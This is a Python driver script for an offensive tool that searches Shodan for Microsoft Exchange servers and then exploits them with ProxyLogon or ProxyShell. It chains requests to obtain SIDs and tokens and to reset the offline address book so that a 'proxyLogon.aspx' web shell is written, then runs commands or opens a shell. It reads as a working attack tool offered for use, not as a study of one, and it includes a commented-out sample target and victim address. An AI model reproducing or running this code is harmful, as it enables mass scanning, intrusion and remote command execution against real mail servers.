from exploit.proxyLogon import ProxyLogon
from exploit.proxyShell import ProxyShell
from shodanApi.apiShodan import ShodanApi
from shodanApi.dataProcess import Table
from colorama import Fore, Back, Style

def exploit_Logon(target, email):

    proxyLogon = ProxyLogon(target, email)
    FQDN = proxyLogon.get_FEServer()
    legacyDN = proxyLogon.get_legacyDN(FQDN)
    SId = proxyLogon.get_SID(FQDN, legacyDN[0], legacyDN[1])
    SeID_CaToken = proxyLogon.get_SeID_CaToken(FQDN, SId)
    OABId = proxyLogon.get_OABId(FQDN, SId, SeID_CaToken[0], SeID_CaToken[1])
    proxyLogon.modify_ExternalLink_OAB(FQDN, SId, SeID_CaToken[0], SeID_CaToken[1], OABId)
    payload_name = "proxyLogon.aspx"
    proxyLogon.reset_OAB(FQDN, SId, SeID_CaToken[0], SeID_CaToken[1], OABId, payload_name)
    proxyLogon.execute_commandLine(payload_name)

def exploit_Shell(target, email):

    proxyShell = ProxyShell(target, email)
    legacyDN = proxyShell.get_legacyDN()
    SId = proxyShell.get_SId(legacyDN)
    token = proxyShell.get_token(SId)
    # print("token: ", token)
    proxyShell.check_valid_token(token)
    proxyShell.shell(target, SId, token, 8000)

def main():

    # parser = argparse.ArgumentParser()
    # parser.add_argument('--target', help='the target Exchange Server ip')
    # parser.add_argument('--email', help='victim email')
    # args = parser.parse_args()

    # target = args.target
    # email = args.email

    # target = "192.168.29.250"
    # email = "administrator@fpt.edu.vn"
    print(Fore.GREEN)
    print("""========================================================================
                ██╗      █████╗ ████████╗██╗   ██╗████████╗
                ██║     ██╔══██╗╚══██╔══╝██║   ██║╚══██╔══╝
                ██║     ███████║   ██║   ██║   ██║   ██║   
                ██║     ██╔══██║   ██║   ██║   ██║   ██║   
                ███████╗██║  ██║   ██║   ╚██████╔╝   ██║   
                ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝    ╚═╝                                              
========================================================================""")
    print("""[1]  Scan network by shodan
[2]  View Result scan
[3]  Exploit MS Exchange with ProxyLogon and ProxyShell
[0]  Exit""")
    while(True):
        try:
            option = int(input("Enter your option: "))
            #  "Microsoft Exchange Server"   country:vn
            if option == 1:
                query = input("Enter your query: ")
                api = ShodanApi(query)
                api.get_Infor()
                continue
            elif option ==2:
                table = Table()
                table.table_csv()
                continue

            elif option ==3:
                target = input("Enter target: ")
                email = input("Enter email: ")
                choose = input("You want to exploit (1 : ProxyLogon or 2 : ProxyShell): ").lower()
                if choose == 'proxylogon' or choose == '1':
                    print("""
        ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███╗   ██╗
        ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔═══██╗████╗  ██║
        ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ██║   ██║██║  ███╗██║   ██║██╔██╗ ██║
        ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██║╚██╗██║
        ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║
        ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
                                                                                       
""")
                    exploit_Logon(target, email)
                elif choose == 'proxyshell' or choose == '2':
                    print("""
        ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     
        ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔════╝██║     ██║     
        ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ███████╗███████║█████╗  ██║     ██║     
        ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ╚════██║██╔══██║██╔══╝  ██║     ██║     
        ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ███████║██║  ██║███████╗███████╗███████╗
        ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                  
""")
                    exploit_Shell(target,email)
                else:
                    print("Please choose type of exploit !!")
                    continue
            elif option == 0:
                    exit()
        except Exception as e:
            print ("Failed: ", e)
            continue
    
if __name__ == '__main__':
    main()
